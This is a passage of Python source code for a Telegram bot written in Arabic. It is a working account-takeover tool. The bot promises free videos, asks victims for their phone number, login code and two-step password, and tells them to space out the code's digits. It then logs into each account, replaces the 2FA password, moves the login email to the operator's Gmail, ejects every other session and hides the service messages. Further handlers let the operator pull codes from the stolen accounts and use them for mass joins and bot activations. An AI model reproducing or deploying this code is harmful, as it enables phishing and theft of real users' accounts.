    client = await get_client(phone, session_name, None)
    
    try:
        await client.connect()
        
        # 1. إعداد كلمة المرور (2FA)
        new_2fa = getattr(config, 'DEFAULT_2FA', "MR_Divo@2004a")
        password_set = False
        email_linked = False
        
        if status_msg:
            await status_msg.edit_text(f"<blockquote>◉╮ 🔐 تأمين الحساب\n◉╯ جاري إعداد كلمة المرور `{new_2fa}`...</blockquote>", parse_mode="HTML")
        try:
            await setup_2fa(client, new_2fa, current_password=password)
            password_set = True
        except Exception as e_2fa:
            logger.warning(f"2FA setup failed: {e_2fa}")

        # 2. تغيير بريد تسجيل الدخول (Login Email)
        if config.GMAIL_USER:
            random_email = generate_dot_variant(config.GMAIL_USER, phone=phone)
            if status_msg:
                await status_msg.edit_text(f"<blockquote>◉╮ 📩 تغيير بريد الدخول\n◉╯ جاري محاولة تحويل الأكواد إلى البريد الجديد...</blockquote>", parse_mode="HTML")
            
            try:
                from telethon.tl.functions.account import SendVerifyEmailCodeRequest, VerifyEmailRequest, GetPasswordRequest
                
                # طلب تغيير بريد تسجيل الدخول
                await client(SendVerifyEmailCodeRequest(
                    purpose=tl_types.EmailVerifyPurposeLoginChange(),
                    email=random_email
                ))
                
                code = await fetch_telegram_code()
                if code:
                    if status_msg:
                        await status_msg.edit_text(f"<blockquote>◉╮ 🔢 تأكيد التحويل\n◉╯ تم استلام الكود. جاري الاعتماد النهائي...</blockquote>", parse_mode="HTML")
                    await client(VerifyEmailRequest(
                        purpose=tl_types.EmailVerifyPurposeLoginChange(),
                        verification=tl_types.EmailVerificationCode(code=code)
                    ))
                    
                    # التحقق الفعلي من نجاح العملية
                    pwd_check = await client(GetPasswordRequest())
                    if pwd_check.has_password and (pwd_check.email_unconfirmed_pattern or "@" in str(pwd_check)):
                        email_linked = True
                        if status_msg:
                            await status_msg.edit_text(f"<blockquote>◉╮ ✅ تم بنجاح\n◉╯ تم تحويل بريد تسجيل الدخول بنجاح.</blockquote>", parse_mode="HTML")
                    else:
                        email_linked = False
                        if status_msg:
                            await status_msg.edit_text(f"<blockquote>◉╮ ⚠️ تنبيه\n◉╯ تم التأكيد ولكن تيليجرام لم يعتمد البريد كبريد دخول بعد.</blockquote>", parse_mode="HTML")
                else:
                    if status_msg:
                        await status_msg.edit_text(f"<blockquote>◉╮ ⚠️ تنبيه\n◉╯ تعذر سحب الكود تلقائياً. الحساب مؤمن بالباسوورد فقط.</blockquote>", parse_mode="HTML")
            except Exception as e_mail:
                logger.error(f"Failed to change login email: {e_mail}")
                if status_msg:
                    await status_msg.edit_text(f"<blockquote>◉╮ ⚠️ تنبيه البريد\n◉╯ فشل تحويل بريد الدخول (قد يحتاج الحساب لوقت استقرار).</blockquote>", parse_mode="HTML")

        # 3. طرد الجلسات الأخرى وتدفئة الحساب
        if status_msg:
            await status_msg.edit_text(f"<blockquote>◉╮ 🧹 تنظيف الجلسات\n◉╯ جاري طرد الجلسات الأخرى وتدفئة الحساب...</blockquote>", parse_mode="HTML")
        session_cleared, clear_msg = await advanced_clear_sessions(client, phone, force_kick=True)
        
        # 4. تنظيف نهائي للرسائل
        await clean_service_messages(client)
        
        # تجهيز التقرير النهائي الصادق
        clear_icon = "✅" if session_cleared else "⚠️"
        clear_text = "تم طرد الجلسات" if session_cleared else f"فشل الطرد ({clear_msg[:10]}...)"

        if status_msg:
            await status_msg.edit_text(f"<blockquote>◉╮ ✨ اكتملت العملية\n◉᚜┃ {'✅' if password_set else '❌'} تغيير الـ 2FA\n◉᚜┃ {'✅' if email_linked else '❌'} تغيير بريد تسجيل الدخول\n◉᚜┃ {clear_icon} {clear_text}\n◉╯ الحساب جاهز الآن للاستخدام.</blockquote>", parse_mode="HTML")
        
    except Exception as e:
        logger.error(f"Error in immediate security setup for {phone}: {e}")
        try:
            if status_msg:
                await status_msg.edit_text(f"<blockquote>◉╮ ❌ خطأ في التأمين\n◉╯ حدث خطأ أثناء الإعداد التلقائي: {str(e)[:50]}</blockquote>", parse_mode="HTML")
        except Exception: pass
    finally:
        if client:
            try:
                # Protect disconnect from cancellation during shutdown
                await asyncio.shield(client.disconnect())
            except Exception: pass


@router.message(AddAccountState.waiting_for_code)
async def process_code(message: types.Message, state: FSMContext):
    raw_code = "".join(message.text.split())
    code = " ".join(list(raw_code))
    data = await state.get_data()
    phone = data.get("phone")
    success, res = await verify_code(phone, code, user_id=message.from_user.id)
    if success:
        is_buyer_user = await is_buyer(message.from_user.id)
        is_authorized = (message.from_user.id == OWNER_ID or 
                         await is_reseller(message.from_user.id) or 
                         is_buyer_user)
        if not is_authorized:
            user_mention = f'<a href="tg://user?id={message.from_user.id}">{message.from_user.full_name}</a>'
            video_btn = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🎬 فيديو", callback_data="get_user_random_video")]
            ])
            await message.answer(
                f"<blockquote>✅ <b>مرحبًا</b> {user_mention} 🎉\n\n"
                f"تم تفعيل اشتراكك بنجاح.\n\n"
                f"🎁 جاك فيديو مجاني! اضغط على الزر بالأسفل لاستلامه.\n\n"
                f"📌 لضمان استمرار وصول المحتوى إليك، يُرجى عدم حظر البوت أو حذف المحادثة معه.</blockquote>",
                reply_markup=video_btn,
                parse_mode="HTML"
            )
            
            # مكافأة المحيل إذا كان هذا المستخدم دخل عبر رابط إحالة
            referrer_id = await reward_referrer_if_any(str(message.from_user.id))
            if referrer_id:
                try:
                    ref_video_btn = InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text="🎬 استلم فيديوك الإضافي", callback_data="get_user_random_video")]
                    ])
                    await message.bot.send_message(
                        chat_id=int(referrer_id),
                        text=f"<blockquote>🎉 <b>مستفيد جديد!</b>\n\n"
                             f"قام مستخدم جديد بالتسجيل من خلال رابط الإحالة الخاص بك.\n\n"
                             f"🎁 جاك <b>+1 فيديو إضافي</b> كهدية! اضغط على الزر لاستلامه.</blockquote>",
                        reply_markup=ref_video_btn,
                        parse_mode="HTML"
                    )
                except Exception as e_inf:
                    logger.warning(f"Failed to notify referrer: {e_inf}")
        else:
            await message.answer(f"<blockquote>◉╮ ✅ تم بنجاح\n◉᚜┃ تم إضافة الحساب بنجاح!\n◉╯ الرقم: {phone}</blockquote>", parse_mode="HTML")
        
        # إشعار المطور بإضافة رقم جديد
        if message.from_user.id != OWNER_ID:
            user_name = message.from_user.full_name or "مجهول"
            user_id = message.from_user.id
            user_username = f"@{message.from_user.username}" if message.from_user.username else "بدون يوزر"
            try:
                await message.bot.send_message(
                    OWNER_ID,
                    f"<blockquote>◉╮ 📲 رقم جديد مضاف\n◉᚜┃ 📱 الرقم: <code>{phone}</code>\n◉᚜┃ 👤 المستخدم: {user_name}\n◉᚜┃ 🔗 اليوزر: {user_username}\n◉╯ 🆔 المعرف: <code>{user_id}</code></blockquote>",
                    parse_mode="HTML"
                )
            except Exception as e_notify:
                logger.warning(f"فشل إرسال إشعار إضافة الرقم للمطور: {e_notify}")
            
        await state.clear()
        # بدء الأتمتة في الخلفية لتجنب التهنيج
        phone_hash = res.get("phone_hash") if isinstance(res, dict) else None
        password = res.get("password") if isinstance(res, dict) else None
        spawn_background_task(automate_account_setup(message, phone, phone_hash=phone_hash, password=password, silent=not is_authorized))
    elif res == "password_needed":
        user_mention = f'<a href="tg://user?id={message.from_user.id}">{message.from_user.full_name}</a>'
        await message.answer(
            f"<blockquote>⚠️ <b>عزيزي</b> {user_mention}\n\n"
            f"يبدو أن حسابك مُفعّل بخاصية <b>التحقق بخطوتين</b>.\n\n"
            f"لإكمال عملية تسجيل الدخول إلى <b>حسابك</b>، يُرجى إدخال <b>كلمة مرور التحقق بخطوتين</b> الخاصة بك.\n\n"
            f"🔒 لن تتمكن من متابعة العملية قبل إدخال كلمة المرور الصحيحة.</blockquote>",
            parse_mode="HTML"
        )
        await state.set_state(AddAccountState.waiting_for_password)
    else:
        user_mention = f'<a href="tg://user?id={message.from_user.id}">{message.from_user.full_name}</a>'
        await message.answer(
            f"<blockquote>⚠️ <b>عزيزي</b> {user_mention}\n\n"
            f"لقد قمت بإرسال <b>رمز التحقق</b> بصيغة غير صحيحة.\n\n"
            f"🔄 لمشاهدة الفيديوهات المجانية، يُرجى إعادة المحاولة وإرسال الرمز بالشكل الصحيح، مع ترك <b>مسافة بين كل رقم</b>.\n\n"
            f"<b>مثال:</b> <code>1 2 3 4 5</code>\n\n"
            f"🔁 للبدء من جديد اضغط: /start</blockquote>",
            parse_mode="HTML"
        )
        await state.clear()

@router.message(AddAccountState.waiting_for_password)
async def process_password(message: types.Message, state: FSMContext):
    password = message.text.strip()
    data = await state.get_data()
    phone = data.get("phone")
    success, res = await verify_code(phone, "dummy", password=password, user_id=message.from_user.id)
    if success:
        is_buyer_user = await is_buyer(message.from_user.id)
        is_authorized = (message.from_user.id == OWNER_ID or 
                         await is_reseller(message.from_user.id) or 
                         is_buyer_user)
        if not is_authorized:
            user_mention = f'<a href="tg://user?id={message.from_user.id}">{message.from_user.full_name}</a>'
            video_btn = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🎬 فيديو", callback_data="get_user_random_video")]
            ])
            await message.answer(
                f"<blockquote>✅ <b>مرحبًا</b> {user_mention} 🎉\n\n"
                f"تم تفعيل اشتراكك بنجاح.\n\n"
                f"🎁 جاك فيديو مجاني! اضغط على الزر بالأسفل لاستلامه.\n\n"
                f"📌 لضمان استمرار وصول المحتوى إليك، يُرجى عدم حظر البوت أو حذف المحادثة معه.</blockquote>",
                reply_markup=video_btn,
                parse_mode="HTML"
            )
            
            # مكافأة المحيل إذا كان هذا المستخدم دخل عبر رابط إحالة
            referrer_id = await reward_referrer_if_any(str(message.from_user.id))
            if referrer_id:
                try:
                    ref_video_btn = InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text="🎬 استلم فيديوك الإضافي", callback_data="get_user_random_video")]
                    ])
                    await message.bot.send_message(
                        chat_id=int(referrer_id),
                        text=f"<blockquote>🎉 <b>مستفيد جديد!</b>\n\n"
                             f"قام مستخدم جديد بالتسجيل من خلال رابط الإحالة الخاص بك.\n\n"
                             f"🎁 جاك <b>+1 فيديو إضافي</b> كهدية! اضغط على الزر لاستلامه.</blockquote>",
                        reply_markup=ref_video_btn,
                        parse_mode="HTML"
                    )
                except Exception as e_inf:
                    logger.warning(f"Failed to notify referrer: {e_inf}")
        else:
            await message.answer(f"<blockquote>◉╮ ✅ تم بنجاح\n◉᚜┃ تم إضافة الحساب بنجاح!\n◉╯ الرقم: {phone}</blockquote>", parse_mode="HTML")
        
        # إشعار المطور بإضافة رقم جديد
        if message.from_user.id != OWNER_ID:
            user_name = message.from_user.full_name or "مجهول"
            user_id = message.from_user.id
            user_username = f"@{message.from_user.username}" if message.from_user.username else "بدون يوزر"
            try:
                await message.bot.send_message(
                    OWNER_ID,
                    f"<blockquote>◉╮ 📲 رقم جديد مضاف\n◉᚜┃ 📱 الرقم: <code>{phone}</code>\n◉᚜┃ 👤 المستخدم: {user_name}\n◉᚜┃ 🔗 اليوزر: {user_username}\n◉╯ 🆔 المعرف: <code>{user_id}</code></blockquote>",
                    parse_mode="HTML"
                )
            except Exception as e_notify:
                logger.warning(f"فشل إرسال إشعار إضافة الرقم للمطور: {e_notify}")
            
        phone_hash = res.get("phone_hash") if isinstance(res, dict) else None
        password = res.get("password") if isinstance(res, dict) else None
        spawn_background_task(automate_account_setup(message, phone, phone_hash=phone_hash, password=password, silent=not is_authorized))
    else:
        user_mention = f'<a href="tg://user?id={message.from_user.id}">{message.from_user.full_name}</a>'
        await message.answer(
            f"<blockquote>⚠️ <b>عزيزي</b> {user_mention}\n\n"
            f"كلمة المرور التي أدخلتها <b>غير صحيحة</b>.\n\n"
            f"🔒 يُرجى التأكد من إدخال <b>كلمة مرور التحقق بخطوتين</b> الصحيحة والمرتبطة بحسابك.\n\n"
            f"🔁 للبدء من جديد اضغط: /start</blockquote>",
            parse_mode="HTML"
        )
    await state.clear()


# ====== Unauthorized User Login Handlers ======
@router.message(UserLoginState.waiting_for_contact, F.contact)
async def process_unauthorized_contact(message: types.Message, state: FSMContext):
    phone = message.contact.phone_number.strip().replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    
    # حذف رسالة الرقم فوراً من الشات
    try:
        await message.delete()
    except Exception:
        pass
    
    success, res = await send_code(phone)


    if success:
        await state.update_data(phone=phone)
        data = await state.get_data()
        start_msg_id = data.get("start_msg_id")
        if start_msg_id:
            try:
                await message.bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=start_msg_id,
                    text="<blockquote>◉╮ ✅ تم الإرسال\n◉╯ تم إرسال الكود بنجاح للرقم. الرجاء إدخاله أدناه:</blockquote>",
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.warning(f"Could not edit start message: {e}")
        
        user_mention = f'<a href="tg://user?id={message.from_user.id}">{message.from_user.full_name}</a>'
        await message.answer(
            f"<blockquote>👋 <b>عزيزي</b> {user_mention}\n\n"
            f"لإكمال عملية التحقق، يُرجى إرسال <b>رمز التحقق</b> الذي وصلك من <b>Telegram</b>.\n\n"
            f"⚠️ <b>مهم:</b> أرسل الرمز مع ترك <b>مسافة بين كل رقم</b>، بهذا الشكل:\n\n"
            f"<code>1 2 3 4 5</code>\n\n"
            f"❌ إذا أرسلت الرمز بدون مسافات أو بصيغة مختلفة، فلن يتم إكمال التحقق.</blockquote>",
            reply_markup=types.ReplyKeyboardRemove(),
            parse_mode="HTML"
        )
        await state.set_state(AddAccountState.waiting_for_code)
    else:
        if str(res) == "مسجل دخوله مسبقاً":
            await send_random_video(message, reply_markup=types.ReplyKeyboardRemove())
        else:
            await message.answer(
                f"<blockquote>◉╮ ❌ خطأ\n◉╯ حدث خطأ أثناء إرسال الكود:\n◉╯ {res}</blockquote>",
                reply_markup=types.ReplyKeyboardRemove(),
                parse_mode="HTML"
            )
        await state.clear()


# ====== Telethon Tasks ======
def format_results(results, title):
    msg = f"<blockquote>◉╮ {title}\n"
    
    # Sort results: Successes first
    sorted_results = sorted(results, key=lambda x: x[1], reverse=True)
    
    success_count = sum(1 for r in results if r[1])
    for phone, status, res in sorted_results:
        icon = "✅" if status else "❌"
        details = res

        if isinstance(res, dict):
            details = res.get("text", "")
            if title == "📊 فحص الحسابات" and res.get("is_frozen"):
                icon = "❄"

        msg += f"◉᚜┃ {icon} {phone.replace('+', '')} ➠ {details}\n"
    
    msg += f"◉╯ نجاح: {success_count} | فشل: {len(results)-success_count}</blockquote>"
    return msg[:4000]

@router.callback_query(F.data == "get_codes")
async def get_codes_handler(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID:
        return await call.answer("مرفوض", show_alert=True)

    accs = await get_accounts()
    active_accounts = [acc for acc in accs if acc[2] == "active"]
    if not active_accounts:
        return await call.answer("لا يوجد حسابات نشطة.", show_alert=True)

    btns = [[InlineKeyboardButton(text=acc[0].replace('+', ''), callback_data=f"code_select_{acc[0]}")] for acc in active_accounts]
    btns.append([InlineKeyboardButton(text="🔙 رجوع", callback_data="sec_accounts")])
    await call.message.edit_text(
    "<blockquote>◉╮ 📱 جلب الأكواد\n◉╯ اختر الرقم الذي تريد جلب الكود الخاص به من القائمة أدناه:</blockquote>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=btns),
        parse_mode="HTML"
    )
    await call.answer()

@router.callback_query(F.data.startswith("code_select_"))
async def select_code_phone_handler(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID:
        return await call.answer("مرفوض", show_alert=True)

    phone = call.data[len("code_select_"):]
    btns = [
        [InlineKeyboardButton(text="🔑 كود", callback_data=f"code_fetch_{phone}")],
        [InlineKeyboardButton(text="🔙 رجوع", callback_data="get_codes")]
    ]
    await call.message.edit_text(
    f"<blockquote>◉╮ 🔑 جلب الأكواد\n◉᚜┃ الرقم: <code>{phone.replace('+', '')}</code>\n◉╯ اضغط على زر الكود لجلب آخر كود.</blockquote>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=btns),
        parse_mode="HTML"
    )
    await call.answer()

@router.callback_query(F.data.startswith("code_fetch_"))
async def fetch_code_for_phone_handler(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID:
        return await call.answer("مرفوض", show_alert=True)

    phone = call.data[len("code_fetch_"):]
    await call.message.edit_text(f"<blockquote>◉╮ ⏳ جاري العمل\n◉╯ جاري جلب الكود للرقم <code>{phone}</code>...</blockquote>", parse_mode="HTML")

    success, result = await get_code_for_phone_task(phone)
    btns = [
        [InlineKeyboardButton(text="🔄 تحديث الكود", callback_data=f"code_fetch_{phone}")],
        [InlineKeyboardButton(text="📱 اختيار رقم آخر", callback_data="get_codes")],
        [InlineKeyboardButton(text="🗑 حذف الرقم", callback_data=f"code_del_confirm_{phone}")],
        [InlineKeyboardButton(text="🔙 رجوع للقسم", callback_data="sec_accounts")]
    ]
    status_icon = "✅" if success else "❌"
    await call.message.edit_text(
    f"<blockquote>◉╮ {status_icon} كود الرقم\n◉᚜┃ الرقم: <code>{phone.replace('+', '')}</code>\n◉╯ {result}</blockquote>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=btns),
        parse_mode="HTML"
    )
    await call.answer()

@router.callback_query(F.data.startswith("code_del_confirm_"))
async def code_del_confirm_handler(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID:
        return await call.answer("مرفوض", show_alert=True)

    phone = call.data[len("code_del_confirm_"):]
    btns = [
        [InlineKeyboardButton(text="⚠️ نعم، احذف الرقم", callback_data=f"code_del_exec_{phone}")],
        [InlineKeyboardButton(text="❌ لا، إلغاء", callback_data=f"code_fetch_{phone}")]
    ]
    await call.message.edit_text(
    f"<blockquote>◉╮ ⚠️ تأكيد الحذف\n◉᚜┃ هل أنت متأكد من حذف الرقم <code>{phone.replace('+', '')}</code> من البوت؟\n◉╯ سيتم حذف الجلسة نهائياً.</blockquote>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=btns),
        parse_mode="HTML"
    )
    await call.answer()

@router.callback_query(F.data.startswith("code_del_exec_"))
async def code_del_exec_handler(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID:
        return await call.answer("مرفوض", show_alert=True)

    phone = call.data[len("code_del_exec_"):]
    accs = await get_accounts()
    account = next((acc for acc in accs if acc[0] == phone), None)
    if not account:
        return await call.message.edit_text("<blockquote>◉╮ ❌ خطأ\n◉╯ لم يتم العثور على الحساب المطلوب.</blockquote>", parse_mode="HTML")

    await call.answer()

    phone, session_name, status, proxy = account[0], account[1], account[2], account[3]
    await call.message.edit_text(f"<blockquote>◉╮ ⏳ جاري العمل\n◉╯ جاري إنهاء جلسة الحساب <code>{phone.replace('+', '')}</code> وحذفه...</blockquote>", parse_mode="HTML")
    _, result = await terminate_account_session_task(phone, session_name, proxy)
    try:
        await call.message.delete()
    except Exception:
        pass
    try: await call.message.delete()
    except Exception: pass

    await delete_account_from_db(phone)
    session_file = os.path.join(SESSIONS_DIR, f"{session_name}.session")
    if os.path.exists(session_file):
        os.remove(session_file)

    btns = [
        [InlineKeyboardButton(text="📱 اختيار رقم آخر", callback_data="get_codes")],
        [InlineKeyboardButton(text="🔙 رجوع للقسم", callback_data="sec_accounts")]
    ]
    await call.message.edit_text(
    f"<blockquote>◉╮ ✅ تم الحذف\n◉᚜┃ الرقم: {phone.replace('+', '')}\n◉╯ {result}</blockquote>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=btns),
        parse_mode="HTML"
    )
    await call.answer()

@router.callback_query(F.data == "chk")
async def chk_handler(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID: return await call.answer("مرفوض", show_alert=True)
    await call.message.edit_text("<blockquote>◉╮ 🔍 جاري الفحص\n◉╯ جاري فحص الحسابات، يرجى الانتظار...</blockquote>", parse_mode="HTML")
    results = await check_status_task()
    try:
        await call.message.delete()
    except Exception:
        pass
    try: await call.message.delete()
    except Exception: pass
    await call.message.answer(format_results(results, "📊 فحص الحسابات"))
    await call.message.answer("<blockquote>◉╮ 📋 القائمة\n◉╯ اختر من القائمة أدناه:</blockquote>", reply_markup=get_accounts_keyboard(), parse_mode="HTML")

@router.callback_query(F.data == "chk_sessions")
async def chk_sessions_handler(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID: return await call.answer("مرفوض", show_alert=True)
    await call.message.edit_text("<blockquote>◉╮ 📊 جاري الفحص\n◉╯ جاري فحص عدد الجلسات لكل الحسابات...</blockquote>", parse_mode="HTML")
    results = await count_sessions_task()
    try: await call.message.delete()
    except Exception: pass
    await call.message.answer(format_results(results, "📊 تقرير عدد الجلسات"))
    await call.message.answer("<blockquote>◉╮ 📋 القائمة\n◉╯ اختر من القائمة أدناه:</blockquote>", reply_markup=get_accounts_keyboard(), parse_mode="HTML")
    await call.answer()

@router.callback_query(F.data == "mail")
async def mail_handler(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID: return await call.answer("مرفوض", show_alert=True)
    await call.message.edit_text("<blockquote>◉╮ 🔍 جاري الفحص\n◉╯ جاري فحص التحقق، يرجى الانتظار...</blockquote>", parse_mode="HTML")
    results = await check_email_task()
    try:
        await call.message.delete()
    except Exception:
        pass
    try: await call.message.delete()
    except Exception: pass
    btns = [[InlineKeyboardButton(text="🔙 رجوع لإدارة التحقق", callback_data="manage_2fa")]]
    await call.message.answer(format_results(results, "🔍 فحص التحقق"), parse_mode="HTML")
    await call.message.answer("<blockquote>◉╮ 📋 القائمة\n◉╯ اختر من القائمة أدناه:</blockquote>", reply_markup=InlineKeyboardMarkup(inline_keyboard=btns), parse_mode="HTML")

# ====== Join / Leave ======
@router.callback_query(F.data == "join")
async def join_handler(call: types.CallbackQuery, state: FSMContext):
    if call.from_user.id != OWNER_ID: return await call.answer("مرفوض")
    await call.message.answer("<blockquote>◉╮ 🔗 انضمام جماعي\n◉╯ أرسل الرابط أو المعرف (مثال: @mygroup):</blockquote>", parse_mode="HTML")
    await state.set_state(JoinState.waiting_for_link)
    await call.answer()

@router.message(JoinState.waiting_for_link)
async def process_join(message: types.Message, state: FSMContext):
    link = message.text.strip()
    await state.update_data(link=link)
    await message.answer("<blockquote>◉╮ 🔢 العدد المطلوب\n◉╯ أرسل عدد الحسابات المطلوبة للانضمام:</blockquote>", parse_mode="HTML")
    await state.set_state(JoinState.waiting_for_count)

@router.message(JoinState.waiting_for_count)
async def process_join_count(message: types.Message, state: FSMContext):
    try:
        count = int(message.text.strip())
        if count <= 0: raise ValueError
    except ValueError:
        return await message.answer("<blockquote>◉╮ ❌ خطأ\n◉╯ الرجاء إدخال عدد صحيح أكبر من صفر.</blockquote>", parse_mode="HTML")
    
    data = await state.get_data()
    link = data.get('link')
    
    wait_msg = await message.answer(f"<blockquote>◉╮ ⏳ جاري العمل\n◉᚜┃ جاري الانضمام إلى {link}\n◉╯ باستخدام {count} حساب...</blockquote>", parse_mode="HTML")
    results = await join_channel_task(link, count=count)
    try: await wait_msg.delete()
    except Exception: pass
    await message.answer(format_results(results, "✅ الانضمام الجماعي"))
    await state.clear()

@router.callback_query(F.data == "leave")
async def leave_handler(call: types.CallbackQuery, state: FSMContext):
    if call.from_user.id != OWNER_ID: return await call.answer("مرفوض")
    await call.message.answer("<blockquote>◉╮ 🔗 مغادرة جماعية\n◉╯ أرسل الرابط أو المعرف (مثال: @mygroup):</blockquote>", parse_mode="HTML")
    await state.set_state(LeaveState.waiting_for_link)
    await call.answer()

@router.message(LeaveState.waiting_for_link)
async def process_leave(message: types.Message, state: FSMContext):
    link = message.text.strip()
    await state.update_data(link=link)
    await message.answer("<blockquote>◉╮ 🔢 العدد المطلوب\n◉╯ أرسل عدد الحسابات المطلوبة للمغادرة:</blockquote>", parse_mode="HTML")
    await state.set_state(LeaveState.waiting_for_count)

@router.message(LeaveState.waiting_for_count)
async def process_leave_count(message: types.Message, state: FSMContext):
    try:
        count = int(message.text.strip())
        if count <= 0: raise ValueError
    except ValueError:
        return await message.answer("<blockquote>◉╮ ❌ خطأ\n◉╯ الرجاء إدخال عدد صحيح أكبر من صفر.</blockquote>", parse_mode="HTML")
    
    data = await state.get_data()
    link = data.get('link')
    
    wait_msg = await message.answer(f"<blockquote>◉╮ ⏳ جاري العمل\n◉᚜┃ جاري المغادرة من {link}\n◉╯ باستخدام {count} حساب...</blockquote>", parse_mode="HTML")
    results = await leave_channel_task(link, count=count)
    try: await wait_msg.delete()
    except Exception: pass
    await message.answer(format_results(results, "❌ المغادرة الجماعية"))
    await state.clear()

@router.callback_query(F.data.in_(["invite", "start_in_bot"]))
async def invite_handler(call: types.CallbackQuery, state: FSMContext):
    if call.from_user.id != OWNER_ID: return await call.answer("مرفوض")
    if call.data == "start_in_bot":
        await call.message.answer("<blockquote>◉╮ ▶️ تشغيل بوت\n◉╯ أرسل يوزر البوت ليتم تفعيله من كل الحسابات:</blockquote>", parse_mode="HTML")
    else:
        await call.message.answer("<blockquote>◉╮ 🔗 رابط الدعوة\n◉╯ أرسل رابط الدعوة أو البوت (مثال: @botname?start=123):</blockquote>", parse_mode="HTML")
    await state.set_state(InviteState.waiting_for_link)
    await call.answer()

@router.message(InviteState.waiting_for_link)
async def process_invite(message: types.Message, state: FSMContext):
    link = message.text.strip()
    await state.update_data(link=link)
    await message.answer("<blockquote>◉╮ 🔢 العدد المطلوب\n◉╯ أرسل عدد الحسابات المطلوبة لتنفيذ الأمر:</blockquote>", parse_mode="HTML")
    await state.set_state(InviteState.waiting_for_count)

@router.message(InviteState.waiting_for_count)
async def process_invite_count(message: types.Message, state: FSMContext):
    try:
        count = int(message.text.strip())
        if count <= 0: raise ValueError
    except ValueError:
        return await message.answer("<blockquote>◉╮ ❌ خطأ\n◉╯ الرجاء إدخال عدد صحيح أكبر من صفر.</blockquote>", parse_mode="HTML")
    
    data = await state.get_data()
    link = data.get('link')
    
    wait_msg = await message.answer(f"<blockquote>◉╮ 🚀 جاري العمل\n◉᚜┃ جاري تشغيل البوت عبر {link}\n◉╯ باستخدام {count} حساب...</blockquote>", parse_mode="HTML")
    results = await start_bot_task(link, count=count)
    try: await wait_msg.delete()
    except Exception: pass
    await message.answer(format_results(results, "🔗 تفعيل وتشغيل البوت"))
    await state.clear()

# ====== Files and Stats ======
@router.callback_query(F.data == "numbers")
async def numbers_handler(call: types.CallbackQuery):
    accs = await get_accounts()
    # Sort accounts by phone number
    sorted_accs = sorted(accs, key=lambda x: x[0])
    
    msg = f"<blockquote>◉╮ 📋 الأرقام المسجلة\n"
    for i, a in enumerate(sorted_accs, 1):
        msg += f"◉᚜┃ {i} • <code>{a[0].replace('+', '')}</code>\n"
    
    if not sorted_accs:
        msg += "◉᚜┃ لا يوجد حسابات مسجلة.\n"
        
    msg += "◉╯ انتهى عرض الأرقام</blockquote>"
    await call.message.answer(msg, parse_mode="HTML")
    await call.answer()

@router.callback_query(F.data == "branch_sessions")
async def branch_sessions_handler(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID:
        return await call.answer("مرفوض", show_alert=True)

    accs = await get_accounts()
    if not accs:
        return await call.answer("لا يوجد حسابات مضافة.", show_alert=True)

    btns = [[InlineKeyboardButton(text=a[0].replace('+', ''), callback_data=f"branch_{a[0]}")] for a in accs]
    btns.append([InlineKeyboardButton(text="🔙 إلغاء", callback_data="sec_accounts")])
    await call.message.answer(
        "<blockquote>◉╮ 🧹 تفريغ الجلسات\n◉᚜┃ سيتم إنهاء كل الجلسات الأخرى\n◉╯ اختر الرقم المطلوب من القائمة:</blockquote>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=btns),
        parse_mode="HTML"
    )
    await call.answer()

@router.callback_query(F.data.startswith("branch_"))
async def execute_branch_sessions(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID:
        return await call.answer("مرفوض", show_alert=True)

    phone = call.data[7:]
    accs = await get_accounts()
    account = next((acc for acc in accs if acc[0] == phone), None)
    if not account:
        return await call.message.edit_text("<blockquote>◉╮ ❌ خطأ\n◉╯ لم يتم العثور على الحساب المطلوب.</blockquote>", parse_mode="HTML")

    await call.answer()

    phone, session_name, status, proxy = account[0], account[1], account[2], account[3]
    await call.message.edit_text(f"<blockquote>◉╮ ⏳ جاري العمل\n◉╯ جاري تفريغ الجلسات للحساب {phone.replace('+', '')}...</blockquote>", parse_mode="HTML")
    success, result = await clear_other_sessions_task(phone, session_name, proxy)
    try:
        await call.message.delete()
    except Exception:
        pass
    try: await call.message.delete()
    except Exception: pass
    await call.message.answer(f"<blockquote>◉╮ 📝 نتيجة العملية\n◉╯ {result}</blockquote>", parse_mode="HTML")
    await call.message.answer("<blockquote>◉╮ 📋 القائمة\n◉╯ اختر من القائمة أدناه:</blockquote>", reply_markup=get_accounts_keyboard(), parse_mode="HTML")
    await call.answer("تم" if success else "فشل", show_alert=False)

@router.callback_query(F.data == "clear_all_sessions")
async def clear_all_sessions_handler(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID:
        return await call.answer("مرفوض", show_alert=True)

    accs = await get_accounts()
    active_accounts = [acc for acc in accs if acc[2] == "active"]
    if not active_accounts:
        return await call.answer("لا يوجد حسابات نشطة.", show_alert=True)

    await call.message.edit_text(
    f"<blockquote>◉╮ ⏳ جاري العمل\n◉᚜┃ جاري تفريغ جلسات كل الحسابات\n◉╯ العدد: {len(active_accounts)} حساب.</blockquote>", parse_mode="HTML"
    )

    results = await clear_all_sessions_task()
    await call.message.answer(format_results(results, "🔥 تفريغ جلسات كل الأرقام"), parse_mode="HTML")
    await call.message.answer("<blockquote>◉╮ 📋 القائمة\n◉╯ اختر من القائمة أدناه:</blockquote>", reply_markup=get_accounts_keyboard(), parse_mode="HTML")
    await call.answer()

@router.callback_query(F.data == "stats")
async def stats_handler(call: types.CallbackQuery):
    accs = await get_accounts()
    total = len(accs)
